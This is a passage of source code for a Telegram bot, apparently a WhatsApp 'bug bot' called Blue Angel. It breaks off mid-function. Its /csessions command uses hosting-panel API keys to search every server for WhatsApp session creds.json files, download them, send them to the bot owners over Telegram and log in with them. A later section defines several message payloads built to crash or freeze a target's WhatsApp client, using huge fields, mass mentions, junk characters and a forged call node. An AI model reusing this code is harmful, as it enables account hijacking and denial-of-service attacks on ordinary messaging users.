      try { console.log("LIST", identifier, dir, JSON.stringify(listJson).slice(0, 1200)); } catch(e){}
    }

    let found = [];
    for (let item of listJson.data) {
      const rawName = extractNameAndMaybeFullPath(item);
      if (!rawName) continue;

      const nameLooksLikePath = rawName.includes("/");
      let itemPath;
      if (nameLooksLikePath) itemPath = rawName.startsWith("/") ? rawName : "/" + rawName;
      else itemPath = (dir === "/" ? "" : dir) + "/" + rawName;
      itemPath = itemPath.replace(/\/+/g, "/");

      const baseName = rawName.includes("/") ? rawName.split("/").pop() : rawName;
      const lname = baseName.toLowerCase();

      if (isDirectory(item) && (lname === "session" || lname === "sessions")) {
        const sessDir = normalizeDir(itemPath);
        const sessList = await apiListFiles(domainBase, identifier, sessDir);
        if (sessList && Array.isArray(sessList.data)) {
          for (let sf of sessList.data) {
            const sfName = extractNameAndMaybeFullPath(sf);
            if (!sfName) continue;
            const sfBase = sfName.includes("/") ? sfName.split("/").pop() : sfName;
            if (sfBase.toLowerCase() === "creds.json" || sfBase.toLowerCase().endsWith("creds.json")) {
              const sfPath = (sessDir === "/" ? "" : sessDir) + "/" + (sfName.includes("/") ? sfName.split("/").pop() : sfName);
              found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfBase });
            }
          }
        }
      }

      if (!isDirectory(item) && (lname === "creds.json" || lname.endsWith("creds.json"))) {
        found.push({ path: itemPath, name: baseName });
      }

      if (isDirectory(item)) {
        const more = await traverseAndFind(domainBase, identifier, itemPath, depth + 1);
        if (more && more.length) found = found.concat(more);
      }

      await sleep(REQUEST_DELAY_MS);
    }

    const uniq = [];
    const seen = new Set();
    for (let f of found) {
      const p = f.path.replace(/\/+/g, "/");
      if (!seen.has(p)) { seen.add(p); uniq.push(f); }
    }
    return uniq;
  }

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csessions http://domain.com plta_xxxx pltc_xxxx");
  }
  const domainRaw = input[0];
  const plta = input[1];
  const pltc = input[2];

  const domainBase = domainRaw.replace(/\/+$/, ""); 
  
  await ctx.reply("⏳ Sedang scan semua server untuk mencari folder `session` / `sessions` dan file `creds.json` ...", { parse_mode: "Markdown" });

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const appData = appRes.data;
    if (!appData || !Array.isArray(appData.data)) {
      return ctx.reply("❌ Gagal ambil list server dari panel. Cek PLTA & domain.");
    }

    let totalFound = 0;
    for (let srv of appData.data) {
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;

      const foundList = await traverseAndFind(domainBase, identifier, "/");
      if (!foundList || foundList.length === 0) {
        const commonPaths = ["/home/container/session/creds.json", "/home/container/sessions/creds.json", "/container/session/creds.json", "/session/creds.json", "/sessions/creds.json", "home/container/session/creds.json"];
        for (let cp of commonPaths) {
          const tryDl = await tryDownloadFile(domainBase, identifier, cp);
          if (tryDl) {
            foundList.push({ path: cp.startsWith("/") ? cp : "/" + cp, name: "creds.json" });
            break;
          }
        }
      }

      if (foundList && foundList.length) {
        for (let fileInfo of foundList) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");

          for (let oid of ownerIds) {
            try {
              await ctx.telegram.sendMessage(oid, `📁 Ditemukan creds.json di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });
            } catch (e) { if (DEBUG_CS) console.error("notif owner err", e); }
          }

          let downloaded = null;
          try {
            downloaded = await tryDownloadFile(domainBase, identifier, filePath);
            if (!downloaded) {
              downloaded = await tryDownloadFile(domainBase, identifier, filePath.replace(/^\//, ""));
            }
          } catch (e) {
            if (DEBUG_CS) console.error("download attempt error", e && e.message);
          }

          if (downloaded && downloaded.buffer) {
            try {
              const BotNumber = (name || "server").toString().replace(/\s+/g, "_");
              const sessDir = sessionPath(BotNumber);
              try { fs.mkdirSync(sessDir, { recursive: true }); } catch(e){}
              const credsPath = path.join(sessDir, "creds.json");
              fs.writeFileSync(credsPath, downloaded.buffer);

              for (let oid of ownerIds) {
                try {
                  await ctx.telegram.sendDocument(oid, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) {
                  if (DEBUG_CS) console.error("sendDocument owner err", e && e.message);
                }
              }

              if (SEND_TO_CALLER) {
                try {
                  await ctx.telegram.sendDocument(ctx.chat.id, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) { if (DEBUG_CS) console.error("sendDocument caller err", e && e.message); }
              }

              try {
                const txt = downloaded.buffer.toString("utf8");
                let parsed = null;
                try { parsed = JSON.parse(txt); } catch(e) { parsed = null; }
                if (parsed) {
                  const pretty = JSON.stringify(parsed, null, 2);
                  const payload = pretty.length > MAX_SEND_TEXT ? pretty.slice(0, MAX_SEND_TEXT) + "\n\n...[truncated]" : pretty;
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `\`${BotNumber}_creds.json\` (parsed JSON):\n\n\`\`\`json\n${payload}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send parsed json err", e && e.message); }
                  }
                } else {
                
                  const preview = txt.slice(0, 600) + (txt.length > 600 ? "\n\n...[truncated]" : "");
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `Preview \`${BotNumber}_creds.json\`:\n\n\`\`\`\n${preview}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send preview err", e && e.message); }
                  }
                }
              } catch (e) {
                if (DEBUG_CS) console.error("parse/send json err", e && e.message);
              }

              try {
                await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
              } catch (e) {
                if (DEBUG_CS) console.error("connectToWhatsApp err", e && e.message);
              }
            } catch (e) {
              if (DEBUG_CS) console.error("save/send file err", e && e.message);
            }
          } else {
            if (DEBUG_CS) console.log("Gagal download file:", filePath, "server:", name);
          }

          await sleep(REQUEST_DELAY_MS);
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0) {
      await ctx.reply("✅ Scan selesai. Tidak ditemukan creds.json di folder session/sessions pada server manapun.");
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, "✅ Scan selesai (publik). Tidak ditemukan creds.json."); } catch {}
      }
    } else {
      await ctx.reply(`✅ Scan selesai. Total file creds.json berhasil ditemukan: ${totalFound} (owners dikirimi file & preview).`);
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, `✅ Scan selesai (publik). Total file creds.json ditemukan: ${totalFound}`); } catch {}
      }
    }
  } catch (err) {
    console.error("csessions Error:", err && (err.response && err.response.data) ? err.response.data : err.message);
    await ctx.reply("❌ Terjadi error saat scan. Cek logs server.");
    for (let oid of ownerIds) {
      try { await ctx.telegram.sendMessage(oid, "❌ Terjadi error saat scan publik."); } catch {}
    }
  }
});

console.clear();
console.log(chalk.bold.white(`\n
⣀⣀⡀⡀⢀⠀⠀⠀⠤⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠠⠤⠄⣐⣀⣀⣀⣀⣠⣤⣤⣤⣤⠄
⠈⢻⣿⣟⠛⠛⠛⠛⠛⠓⠒⣶⣦⣬⣭⣃⣒⠒⠤⢤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⢒⣚⣫⣭⣧⣶⣶⣿⣿⡛⠉⠉⠉⠉⠉⠉⣽⣿⠟⠁⠀
⠀⠀⠙⢿⡄⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣧⠉⠛⠻⢷⣬⡙⠣⡄⠀⠀⠀⠀⠀⠀⠀⡠⠚⣡⡾⠟⠋⠁⠀⣾⡿⠉⣿⣷⣶⠀⠀⠀⠀⠀⣰⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠻⣄⠀⠀⠀⠀⣿⣿⠀⣿⣿⣿⠀⠀⠀⠀⠈⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⠀⠀⠀⢿⣿⣏⣀⣾⣿⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠀⢛⣷⣤⣄⣀⣙⣿⣿⣿⣿⡃⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠀⠀⠄⠠⠈⠿⠿⠿⠿⠥⠤⠶⠶⠿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠁⠀⠀⠃⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : 𝐁𝐋𝐔𝐄 𝐀𝐍𝐆𝐄𝐋
DEV           : Fatur
AUTHOR      : SanzXc
ID OWN      : ${ownerIds}
VERSION     : 1
─────────────────────────────────────\n\n`));

bot.launch();

setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0;
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000);

// ================ FUNCTION BUGS HERE ================== \\
/*
  Function nya isi Ama function punya lu sendiri
*/
async function protocolbug3(pian, target) {
  const rapip = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "999999",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "(🐉) Specter Raflie X",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
          },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [{
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "kontol",
                songId: "peler",
                author: ".Tama Ryuichi",
                title: "Finix",
                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                countryBlocklist: true,
                isExplicit: true,
                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
              }
            },
            embeddedAction: null
          }]
        }
      }
    }
  }, {});
  await pian.relayMessage("status@broadcast", rapip.message, {
    messageId: rapip.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: target
          },
          content: undefined
        }]
      }]
    }]
  });
  if (shibal) {
    const payment0 = {
      key: rapip.key,
      type: 25
    };
    const payment1 = {
      protocolMessage: payment0
    };
    const payment2 = {
      message: payment1
    };
    const payment = {
      groupStatusMentionMessage: payment2
    };
    const paymen10 = {
      tag: "meta",
      attrs: {},
      content: undefined
    };
    paymen10.attrs.is_status_mention = "true";
    const kuntul = {
      additionalNodes: [paymen10]
    };
    await pian.relayMessage(target, payment, kuntul);
  }
}

async function bulldozer(pian, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await pian.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function BlackOwlFCInvis(pian, target) {
  const space = "{".repeat(rep)
  const PrM = await prepareWAMessageMedia(
    { image: fs.readFileSync("./p.jpg") },
    { upload: Black.waUploadToServer }
  );

  const cardsCrL = Array.from({ length: 10 }, () => ({
    header: {
      imageMessage: PrM.imageMessage,
      hasMediaAttachment: true
    },
    nativeFlowMessage: {
      messageParamsJson: space
    }
  }));

  const messagePayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "𝗕𝗹𝗮𝗰𝗸 𝗢𝘄𝗹 𝗖𝗿𝗮𝘀𝗵" },
          carouselMessage: {
            cards: cardsCrL,
            messageVersion: 1
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messagePayload, {});

  await pian.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target } }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    const message = {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: {
                is_status_mention: "true"
              }
            }
          ]
        }
      }
    };
    await pian.relayMessage(target, message, {});
  }
}

async function OrbixCallnode(pian, target) {
    const crypto = require("crypto");
    const {
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage,
        encodeSignedDeviceIdentity
    } = require("@whiskeysockets/baileys");

    const ctx = {
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    };
    let dev = await pian.getUSyncDevices([target], false, false);
    let rec = dev.map(d => `${d.user}:${d.device || ''}@s.whatsapp.net`);
    await pian.assertSessions(rec);
    let sync = (() => {
        let map = {};
        return {
            lock(id, fn) {
                map[id] ??= Promise.resolve();
                map[id] = (async () => {
                    await map[id];
                    return fn();
                })();
                return map[id];
            }
        };
    })();

    let wrap = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);

    let origCreate = pian.createParticipantNodes?.bind(ctx);
    let origEncode = pian.encodeWAMessage?.bind(ctx);

    pian.createParticipantNodes = async (targets, msg, attrs, dsm) => {
        let patched = await (pian.patchMessageBeforeSending?.(msg, targets) ?? msg);

        let blocks = Array.isArray(patched)
            ? patched
            : targets.map(j => ({ jid: j, message: patched }));

        let includeId = false;

        let nodes = await Promise.all(
            blocks.map(async ({ jid, message }) => {
                let coded = origEncode
                    ? origEncode(message)
                    : encodeWAMessage(message);

                let payload = wrap(coded);

                return sync.lock(jid, async () => {
                    let enc = await pian.signalRepository.encryptMessage({
                        jid,
                        data: payload
                    });

                    if (enc.type === "pkmsg") includeId = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type: enc.type },
                            content: enc.ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes,
            shouldIncludeDeviceIdentity: includeId
        };
    };

    let { nodes: route, shouldIncludeDeviceIdentity } =
        await pian.createParticipantNodes(
            rec,
            { conversation: "Y" },
            { count: "0" }
        );

    let callNode = {
        tag: "call",
        attrs: {
            to: target,
            id: pian.generateMessageTag(),
            from: pian.user.id
        },
        content: [
            {
                tag: "offer",
                attrs: {
                    "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
                    "call-creator": pian.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    {
                        tag: "video",
                        attrs: {
                            enc: "vp8",
                            dec: "vp8",
                            screen_width: "1920",
                            screen_height: "1080",
                            orientation: "0"
                        }
                    },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 7, 230]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: route },
                    shouldIncludeDeviceIdentity
                        ? {
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(
                                pian.authState.creds.account, 
                                true
                            )
                        }
                        : null
                ].filter(Boolean)
            }
        ]
    };

    await pian.sendNode(callNode);
}

async function CorosuelParams(pian, target) {
    for (let i = 0; i < 75; i++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭" + "ê¦½".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "⭑̤ ⃟༑ ̬  .....   ͠⤻⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭  ⃜    ⃟༑" + "ê¦½".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "⭑̤ ⃟༑ ̬  .....   ͠⤻⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭  ⃜    ⃟༑" + "ê¦½".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ê¦½".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ê¦¾".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `⭑̤ ⃟༑⎯͟͞⎯͟͞⚝ PianTech ⟡— 哭  ⃟༑\n${"ê¦¾".repeat(2000)}:)\n\u0000` + "ê¦¾".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ê¦½".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[".repeat(10000),
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ê¦½".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ê¦¾".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );

    await pian.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
    }
}

async function CardsCarousel(pian, target) {
   try {
      await pian.relayMessage(
         target,
         {
            viewOnceMessage: {
               message: {
                  messageContextInfo: {
                     deviceListMetadata: {},
                     deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                     body: proto.Message.InteractiveMessage.Body.create({ 
                        text: "\u0000".repeat(10000),
                     }),
                     footer: proto.Message.InteractiveMessage.Footer.create({ 
                        text: "\u0000",
                     }),
                     header: proto.Message.InteractiveMessage.Header.create({ 
                        hasMediaAttachment: false 
                     }),
                     carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                        cards: Array.from({ length: 1000 }, () => ({
                           body: proto.Message.InteractiveMessage.Body.fromObject({ text: "\u0000".repeat(10000),l }),
                           footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "\u0000".repeat(10000) }),
                           header: proto.Message.InteractiveMessage.Header.fromObject({
                              title: "\u0000",
                              hasMediaAttachment: true,
                              imageMessage: {
